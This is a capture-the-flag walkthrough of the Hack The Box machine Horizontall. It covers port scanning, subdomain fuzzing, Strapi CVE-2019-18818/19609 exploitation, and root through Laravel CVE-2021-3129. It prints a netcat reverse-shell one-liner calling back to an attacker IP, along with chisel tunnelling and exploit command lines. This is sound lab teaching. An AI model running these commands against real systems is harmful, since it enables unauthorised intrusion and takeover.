# Horizontall

The first thing I did was run a <mark style="color:green;">`Rustscan`</mark> on the target to quickly gather open ports.

```bash
rustscan -a 10.129.151.240 -- -A -sC -sV
```

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmINBJNsYC8F7jN0=
|   256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We add <mark style="color:green;">`horizontall.htb`</mark> to our <mark style="color:green;">`/etc/hosts`</mark> file since in the output we got "_Did not follow redirect to http://horizontall.htb_"

![](<../../../../.gitbook/assets/image (7) (1) (1).png>)

Searching on Google informs us that the latest version of <mark style="color:green;">`nginx`</mark> is 1.21.6 (mainline version) and 1.20.2 (stable version). We'll keep this in mind.

Going to the site, we see a web page.

![](<../../../../.gitbook/assets/image (36).png>)

Viewing the source code and going through the site really did not provide anything useful. However, is it possible for the <mark style="color:green;">`nginx`</mark> server to have more vhosts or subdomains? Using <mark style="color:green;">`ffuf`</mark>, we will see something.

```bash
ffuf -u http://horizontall.htb -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.horizontall.htb' -fs 0 -mc 200 
```

![api-prod subdomain](<../../../../.gitbook/assets/image (30) (1) (1).png>)

Heading back over to the browser, we are presented with a basic welcome page.

![](<../../../../.gitbook/assets/image (42) (1).png>)

Time to enumerate some more. Now there are two interesting directories that we can explore.

![](<../../../../.gitbook/assets/image (35) (1).png>)

The reviews directory yields us some users: <mark style="color:green;">`wail`</mark>, <mark style="color:green;">`doe`</mark>, and <mark style="color:green;">`john`</mark>

![](<../../../../.gitbook/assets/image (33) (1) (1).png>)

And the admin page

![](<../../../../.gitbook/assets/image (40) (1) (1).png>)

Doing a google search on <mark style="color:green;">`strapi`</mark> shows that it is an open source Node.js headless Content Management System (CMS)

Great! Now hopefully we can find a version number somewhere...

![](<../../../../.gitbook/assets/image (16) (1).png>)

It seems the current version of is <mark style="color:green;">`Strapi 3.0.0-beta.17.4`</mark>

![](<../../../../.gitbook/assets/image (37) (1).png>)

Using <mark style="color:green;">`searchsploit`</mark> gives us some good news. Remote Code Execution ([RCE](https://www.exploit-db.com/exploits/50239))!

![](<../../../../.gitbook/assets/image (58).png>)

According to [CVE-2019-18818](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-18818)

> strapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js."

There's also [CVE-2019-19609](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19609)

> The Strapi framework before 3.0.0-beta.17.8 is vulnerable to Remote Code Execution in the Install and Uninstall Plugin components of the Admin panel, because it does not sanitize the plugin name, and attackers can inject arbitrary shell commands to be executed by the execa function.

We run the exploit and then login

![](<../../../../.gitbook/assets/image (63).png>)

![](<../../../../.gitbook/assets/image (24) (1) (1).png>)

Awesome! Now there's Plugin called "Files Upload", let's see if we can upload a file to get a reverse shell.

I tried multiple times to get a shell, but the output of following the file yielded something like this:

![](<../../../../.gitbook/assets/image (69) (1).png>)

```
http://localhost:1337/uploads/0083c7ac6ed14dce9cc54821af03bf08.php
```

Which made sense based on the exploit code (that's why we see port 1337). I was thinking about if we could do something with changing the port, but that seemed like something too complex and lead to a deep rabbit hole. Then I thought, if we have RCE already from the exploit, couldn't we just try to get a shell that way?

As it turns out, that was a very quick solution

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.38 4444 >/tmp/f
```

![](<../../../../.gitbook/assets/image (64) (1).png>)

After upgrading my shell, I searched for the user.txt file

![](<../../../../.gitbook/assets/image (46) (1).png>)

I ran linepeas.sh and noticed something interesting. Looks like there is MySQL running and something else on port 8000. What is that port used for?

![](<../../../../.gitbook/assets/image (41) (1) (1).png>)

A Google search gave me this result

> TCP Port 8000 is commonly used for development environments of web server software. It generally should not be exposed directly to the Internet. If you are running software like this on the Internet, you should consider placing it behind a reverse proxy.
>
> [Source](https://www.elastic.co/guide/en/siem/guide/current/tcp-port-8000-activity-to-the-internet.html)

This most likely means we might have to do some port forwarding in order to see the website. But first let's see if we can grab some information before doing this.

Using <mark style="color:green;">`curl -v localhost:8000`</mark> gave us a site powered by Laravel AND it's version number

![](<../../../../.gitbook/assets/image (65).png>)

Searching for exploits I found these which were helpful

{% embed url="https://www.exploit-db.com/exploits/49424" %}

{% embed url="https://www.ambionics.io/blog/laravel-debug-rce" %}

{% embed url="https://github.com/nth347/CVE-2021-3129_exploit" %}

According to [CVE-2021-3129](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3129)

> Ignition before 2.5.2, as used in Laravel and other products, allows unauthenticated remote attackers to execute arbitrary code because of insecure usage of file\_get\_contents() and file\_put\_contents(). This is exploitable on sites using debug mode with Laravel before 8.4.2.

#### Port Forwarding

Now to do some port forwarding. We'll use the [chisel ](https://github.com/jpillora/chisel)tool

We'll transfer it to our victim machine and make it an executable

![](<../../../../.gitbook/assets/image (34).png>)

Then we'll run the below commands on our kali machine and the victim machine respectively

```bash
./chisel server -p 7777 --reverse # Kali machine
./chisel client 10.10.14.38:7777 R:8000:127.0.0.1:8000 # on Victim
```

![](<../../../../.gitbook/assets/image (38) (1).png>)

![Victim machine](<../../../../.gitbook/assets/image (5).png>)

Now when we go to <mark style="color:green;">`http://127.0.0.1:8000`</mark> in the browser, we can see the Laravel site

![](<../../../../.gitbook/assets/image (49) (1).png>)

#### Priv Esc

Using the GitHub resource for the Laravel vulnerability, we'll execute the following command

```python
./privesc.py http://localhost:8000 Monolog/RCE1 "whoami"
```

![](<../../../../.gitbook/assets/image (67) (1).png>)

Awesome! Now we can cat the root.txt file

![](<../../../../.gitbook/assets/image (59).png>)

This is nice, but a shell would be nicer :)

![](<../../../../.gitbook/assets/image (18) (1).png>)

![](<../../../../.gitbook/assets/image (55) (1).png>)

{% hint style="info" %}
Although we get a shell, it's not very stable. But it does the job regardless
{% endhint %}

SUCCESS!

![](<../../../../.gitbook/assets/image (15) (1).png>)
